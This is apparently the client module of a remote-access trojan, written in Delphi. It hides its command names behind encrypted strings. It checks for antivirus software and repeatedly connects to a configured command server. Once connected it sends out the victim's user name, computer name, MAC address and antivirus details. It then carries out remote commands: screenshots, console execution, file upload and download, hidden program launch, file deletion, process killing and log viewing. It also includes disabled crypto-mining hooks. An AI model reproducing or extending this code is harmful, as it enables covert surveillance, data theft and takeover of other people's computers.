unit Cli;

interface

uses
  Windows, SysUtils, Classes, ExtCtrls, uSockets, uTypes, uFnc, CliP, uAnt, uEnc;

type
  CList = record
    inftion: string; // information
    schoot: string; // screenshoot
    sypower: string; // |sys_poweroff|sys_powerrestart|sys_logoff
    cnsrn: string; // console_run
    cnscm: string; // console_cmd
    cnsstp: string; // console_stop
    fmdrlst: string; // |fm_disklist|fm_desktop|fm_userdir|fm_listdir
    fmfisnd: string; // fm_filesend
    fmfircv: string; // fm_filerecv
    fmfirn: string; // fm_filerun
    fmfirnhd: string; // fm_filerunhidden
    fmfict: string; // fm_filecut
    fmficy: string; // fm_filecopy
    fmfirnm: string; // fm_filerename
    fmfidl: string; // fm_filedelete
    fmfidlh: string; // fm_filedeletehard
    fmficrdr: string; // fm_filecreatedir
    fmficrfl: string; // fm_filecreatefile
    fmfiinf: string; // fm_fileinfo
    fmvvim: string; // fm_viewimage
    fmvvtx: string; // fm_viewtext
    fmdtntp: string; // fm_editnotepad
    fmdtntps: string; // fm_editnotepadsave
    peli: string; // pe_list
    pekl: string; // pe_kill
    penw: string; // pe_new
    lgli: string; // log_list
    lgvi: string; // log_view
    mngst: string; // mining_start
    mngsop: string; // mining_stop
    mngeab: string; // mining_enable
    mngdsb: string; // mining_disable
    mngup: string; // mining_update
  end;

type
  TCli = class(TComponent)
  private
    CT: TTimer;
    procedure ServerConnect(Client: TTCPConnection);
    procedure ServerDisconnect(Client: TTCPConnection);
    procedure ServerError(Socket: TTCPSocket);
    procedure ServerExecute(Thread: TTCPConnectionThread);
    procedure CTHandler(Sender: TObject);
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    destructor Destroy; override;
    procedure Run;
    procedure Stop;
  end;

var
  TCPClient: TTCPClientConnection;
  ConfigData: TCnfg;
  CProc: CPr;
  AVrs: string;
  CEn: CList;

procedure Register;

implementation

procedure Register;
begin
  Classes.RegisterComponents('TP1', [TCli]);
end;

constructor TCli.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(AOwner);

  ConfigData := Config;

  // Set Encrypted Client Command
  with CEn do begin
    inftion := DE('gJAPy/HY7+Ek4ZK'); // information
    schoot := DE('6BgHHAoNksWirmA'); // screenshoot
    sypower := DE('1hC0oqEYT3BCfi2SZqBm1y/cK0syMD7Dnm666iUcQCfhnyPCilISENE'); // |sys_poweroff|sys_powerrestart|sys_logoff
    cnsrn := DE('qNReesY+WJSr5vI'); // console_run
    cnscm := DE('qNReesY+WJCvJnF'); // console_cmd
    cnsstp := DE('qNReesY+WJCrJnPb'); // console_stop
    fmdrlst := DE('11T9EAkL64yqNJ+5+Fs3F+FSmgM6UsbMp5UJPXBHlvb+V0Me7RhREJ71mHVm'); // |fm_disklist|fm_desktop|fm_userdir|fm_listdir
    fmfisnd := DE('vle9LDgDu36/ExD'); // fm_filesend
    fmfircv := DE('vle9LDgDuzaqURF'); // fm_filerecv
    fmfirn := DE('vle9LDgDuzauwB'); // fm_filerun
    fmfirnhd := DE('vle9LDgDuzauwVjfVE03mD'); // fm_filerunhidden
    fmfict := DE('vle9LDgDu3L9GC'); // fm_filecut
    fmficy := DE('vle9LDgDu3r7rxC'); // fm_filecopy
    fmfirnm := DE('vle9LDgDuzaqZpkNND'); // fm_filerename
    fmfidl := DE('vle9LDgDur7cyZ3eMC'); // fm_filedelete
    fmfidlh := DE('vle9LDgDur7cyZ3eMmqlalI'); // fm_filedeletehard
    fmficrdr := DE('vle9LDgDu378GJuBCRhf5C'); // fm_filecreatedir
    fmficrfl := DE('vle9LDgDu378GJuBCZR32PO'); // fm_filecreatefile
    fmfiinf := DE('vle9LDgDufLx5zH'); // fm_fileinfo
    fmvvim := DE('vle9bnjmrPDAzC42'); // fm_viewimage
    fmvvtx := DE('vle9bnjmr7SAkHK'); // fm_viewtext
    fmdtntp := DE('vle9IrZqALC8aH0qZyI'); // fm_editnotepad
    fmdtntps := DE('vle9IrZqALC8aH0qZyYG0f3A'); // fm_editnotepadsave
    peli := DE('5B/BwYhDiC'); // pe_list
    pekl := DE('5B/B30EfzA'); // pe_kill
    penw := DE('5B/BykX8'); // pe_new
    lgli := DE('ltB4AVLGnqG'); // log_list
    lgvi := DE('ltB4A968o+O'); // log_view
    mngst := DE('k98fUZcoG36gubjI'); // mining_start
    mngsop := DE('k98fUZcoG36ggrI'); // mining_stop
    mngeab := DE('k98fUZcoGv7LkgGtYC'); // mining_enable
    mngdsb := DE('k98fUZcoGr7G5/RVElP'); // mining_disable
    mngup := DE('k98fUZcoGvqKyfTARC'); // mining_update
  end;

  // Create Commander Timer
  if not Assigned(CT) then CT := TTimer.Create(Self);
  with CT do
  begin
    Enabled := False;
    OnTimer := CTHandler;
    Interval := 10000;
  end;

  // Create TCPCLient
  if not Assigned(TCPClient) then TCPClient := TTCPClientConnection.Create;
  with TCPClient do
  begin
    OnConnect := ServerConnect;
    OnDisconnect := ServerDisconnect;
    OnExecute := ServerExecute;
    OnError := ServerError;
  end;
end;

destructor TCli.Destroy;
begin
  CProc.Free;

  inherited Destroy;
end;

{****************************************************************************
                            Public Functions
****************************************************************************}

procedure TCli.Run;
begin
  if ConfigData.SO <> 'XP' then
    try
      AVrs := GetAVP;
    except
    end;

  CT.Enabled := True;
end; {* Client Start *}

procedure TCli.Stop;
begin
  CT.Enabled := False;
  TCPClient.Disconnect;
end; {* Client Stop *}

{****************************************************************************
                            Private Functions
****************************************************************************}

procedure ConnectServer;
begin
  if iInCon then
  try
    TCPClient.Connect(ConfigData.TpP + ':' + IntToStr(ConfigData.TpPo));
  except
  end;
end; { ConnectServer -> Connect Thread }

procedure TCli.CTHandler(Sender: TObject);
var
  Th: Cardinal;
begin
  CT.Interval := ConfigData.TpTmr;

  if ConfigData.TpEnb then
    if not TCPClient.Connected then
      CreateThread(nil, 0, @ConnectServer, 0, 0, Th);
end; { CTHandler -> Connecting Timer }

{****************************************************************************
                   TCPClient Handler -> Baþlangýç
****************************************************************************}

procedure TCli.ServerConnect(Client: TTCPConnection);
begin
  // Create Client Process
  if not Assigned(CProc) then CProc := CPr.Create(Owner, ConfigData);

  // Set Buffer 64K
  Client.SendBufferSize := 65536;

  // Create Thread
  Client.Detach;

  // Send First Information
  Client.WriteLn(DE('v1ulO09UKHHBN0X8qbh2q/G')); // first_information
  Client.WriteLn(Format('%s|%s|%s|%s|%s|%s|%s|%s', [GtPUsNa, GtCoNa,
    AVrs, ConfigData.SO,
      IntToStr(ConfigData.Vsr), BlToSt(ConfigData.Mng.Eal),
      GtMcAdr, BoolToStr(I6Bt)
      ]));
end; {* Server Connected Process *}

procedure TCli.ServerDisconnect(Client: TTCPConnection);
begin
end; {* Server Disconnected Process *}

procedure TCli.ServerError(Socket: TTCPSocket);
begin
end; {* Server Connecting Error Process *}

procedure TCli.ServerExecute(Thread: TTCPConnectionThread);
var
  Co: string;
begin
  // Read Command
  Co := Thread.Connection.ReadLn;

  // Commands
  try
    if Co = CEn.inftion then CProc.GtInf(Thread, Co);
    if Co = CEn.schoot then CProc.GtScSh(Thread, Co);

    if POS(Co, CEn.sypower) > 0 then CProc.SsPow(Thread, Co);

    if Co = CEn.cnsrn then CProc.CoRu(Thread, Co);
    if Co = CEn.cnscm then CProc.CoCm(Thread, Co);
    if Co = CEn.cnsstp then CProc.CoSt(Thread, Co);

    if POS(Co, CEn.fmdrlst) > 0 then CProc.FiLiFol(Thread, Co);
    if Co = CEn.fmfisnd then CProc.FiSe(Thread, Co);
    if Co = CEn.fmfircv then CProc.FiRc(Thread, Co);
    if Co = CEn.fmfirn then CProc.FiRn(Thread, Co);
    if Co = CEn.fmfirnhd then CProc.FiRnHd(Thread, Co);
    if Co = CEn.fmfict then CProc.FiCtPs(Thread, Co);
    if Co = CEn.fmficy then CProc.FiPs(Thread, Co);
    if Co = CEn.fmfirnm then CProc.FiRnm(Thread, Co);
    if Co = CEn.fmfidl then CProc.FiDl(Thread, Co);
    if Co = CEn.fmfidlh then CProc.FiDlH(Thread, Co);
    if Co = CEn.fmficrdr then CProc.FiCrDr(Thread, Co);
    if Co = CEn.fmficrfl then CProc.FiCrFi(Thread, Co);
    if Co = CEn.fmfiinf then CProc.FiInf(Thread, Co);
    if Co = CEn.fmvvim then CProc.FiPrIm(Thread, Co);
    if Co = CEn.fmvvtx then CProc.FiPrTx(Thread, Co);
    if Co = CEn.fmdtntp then CProc.FiNo(Thread, Co);
    if Co = CEn.fmdtntps then CProc.FiNoS(Thread, Co);

    if Co = CEn.peli then CProc.PrcLi(Thread, Co);
    if Co = CEn.pekl then CProc.PrcKl(Thread, Co);
    if Co = CEn.penw then CProc.PrcNw(Thread, Co);

    if Co = CEn.lgli then CProc.LgLt(Thread, Co);
    if Co = CEn.lgvi then CProc.LgVw(Thread, Co);

    // Mining
   { if Co = CEn.mngst then CProc.MnSt(Thread, Co);
    if Co = CEn.mngsop then CProc.MnSto(Thread, Co);
    if Co = CEn.mngeab then CProc.MnEal(Thread, Co);
    if Co = CEn.mngdsb then CProc.MnDsb(Thread, Co);
    if Co = CEn.mngup then CProc.MnUp(Thread, Co);}
  except
  end;
end; {* Server Listening Process *}



end.

